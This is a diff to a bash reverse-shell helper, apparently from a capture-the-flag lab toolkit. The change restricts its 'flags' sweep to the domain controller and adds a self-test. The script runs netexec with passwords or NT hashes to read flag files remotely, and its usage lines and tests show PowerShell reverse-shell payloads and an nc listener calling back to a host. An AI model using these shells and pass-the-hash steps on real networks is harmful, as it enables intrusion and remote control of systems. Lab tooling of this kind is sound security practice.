@@ -11,10 +11,16 @@
 #           try to hold an interactive shell open over MCP; the ~30s host cap
 #           kills it. Catch it in a tty instead.
 #
+# DC ONLY. The takeover flag lives on the domain controller (Administrator
+# desktop). This helper targets the DC and nothing else: the target defaults to
+# $ADTK_DC and `flags` refuses to sweep a non-DC host unless you pass --any.
+# Don't fan reverse shells across member servers — grab the flag on the DC.
+#
 # Public payloads only (PowerShell TCP / ConPtyShell / nc.exe) — same category
 # as the evil-winrm/psexec already in the rack. No third-party C2, no malware.
 #
-#   revshell.sh flags 10.10.11.47 -u Administrator -H <NT> -d thm.local
+#   export ADTK_DC=192.168.56.10
+#   revshell.sh flags -u Administrator -H <NT> -d thm.local     # DC from $ADTK_DC
 #   revshell.sh flags 192.168.56.10 -u lord.varys -p 'PW' -d sevenkingdoms.local
 #   revshell.sh payload 10.66.70.25 4444 ps        # print a PS reverse shell
 #   revshell.sh payload 10.66.70.25 4444 conpty    # fully-interactive PTY
@@ -33,8 +39,9 @@ FLAG_PS='$ErrorActionPreference="SilentlyContinue";'\
 ' ForEach-Object { "=== "+$_.FullName+" ==="; Get-Content -Raw $_.FullName }'
 
 do_flags() {
-  local target="${1:-}"; shift || true
-  local user="" pass="" nthash="" domain="" method="winrm"
+  # DC only: target defaults to $ADTK_DC; a positional overrides it, but a
+  # target that isn't the DC is refused unless --any is passed.
+  local target="" user="" pass="" nthash="" domain="" method="winrm" any=0
   while [ "$#" -gt 0 ]; do
     case "$1" in
       -u) user="$2"; shift 2 ;;
@@ -42,10 +49,19 @@ do_flags() {
       -H|--hash) nthash="$2"; shift 2 ;;
       -d|--domain) domain="$2"; shift 2 ;;
       --exec) method="$2"; shift 2 ;;
-      *) echo "[!] flags: unknown arg $1" >&2; return 2 ;;
+      --any) any=1; shift ;;
+      -*) echo "[!] flags: unknown arg $1" >&2; return 2 ;;
+      *) target="$1"; shift ;;
     esac
   done
-  [ -n "$target" ] && [ -n "$user" ] || { echo "usage: revshell.sh flags <target> -u USER (-p PASS | -H NT) [-d DOMAIN] [--exec winrm|smb]" >&2; return 2; }
+  local dc="${ADTK_DC:-}"
+  [ -n "$target" ] || target="$dc"
+  [ -n "$target" ] && [ -n "$user" ] || { echo "usage: revshell.sh flags [DC] -u USER (-p PASS | -H NT) [-d DOMAIN] [--exec winrm|smb] [--any]" >&2; echo "       (DC defaults to \$ADTK_DC; the flag lives on the DC — --any to hit a non-DC host)" >&2; return 2; }
+  if [ -n "$dc" ] && [ "$target" != "$dc" ] && [ "$any" = 0 ]; then
+    echo "[!] $target is not the DC (\$ADTK_DC=$dc). The takeover flag is on the DC." >&2
+    echo "    Run against the DC, or pass --any to override." >&2
+    return 2
+  fi
   local NXC; NXC="$(nxc_bin)"; [ -n "$NXC" ] || { echo "[!] nxc/netexec missing" >&2; return 2; }
   local auth=(-u "$user")
   if [ -n "$nthash" ]; then auth+=(-H "$nthash"); else auth+=(-p "$pass"); fi
@@ -124,9 +140,14 @@ case "$sub" in
     out="$(do_payload 10.0.0.1 4444 ps)"; echo "$out" | grep -q "TCPClient('10.0.0.1',4444)" || { echo "[!] ps payload"; fail=1; }
     do_listen 5555 | grep -q "nc -lvnp 5555" || { echo "[!] listen"; fail=1; }
     [ -n "$FLAG_PS" ] || { echo "[!] flag sweep empty"; fail=1; }
+    # DC-only gate: a non-DC target is refused, but --any overrides it.
+    g1="$(ADTK_DC=1.1.1.1 do_flags 2.2.2.2 -u x -p y 2>&1)"
+    case "$g1" in *"is not the DC"*) : ;; *) echo "[!] non-DC not refused"; fail=1 ;; esac
+    g2="$(ADTK_DC=1.1.1.1 do_flags 2.2.2.2 -u x -p y --any 2>&1)"
+    case "$g2" in *"is not the DC"*) echo "[!] --any not honored"; fail=1 ;; esac
     [ "$fail" = 0 ] && echo "[self-test] revshell ok" || exit 1
     ;;
   ""|-h|--help)
-    sed -n '2,26p' "$0" | sed 's/^# \{0,1\}//' ;;
+    sed -n '2,29p' "$0" | sed 's/^# \{0,1\}//' ;;
   *) echo "[!] unknown subcommand: $sub (flags|payload|listen)" >&2; exit 2 ;;
 esac
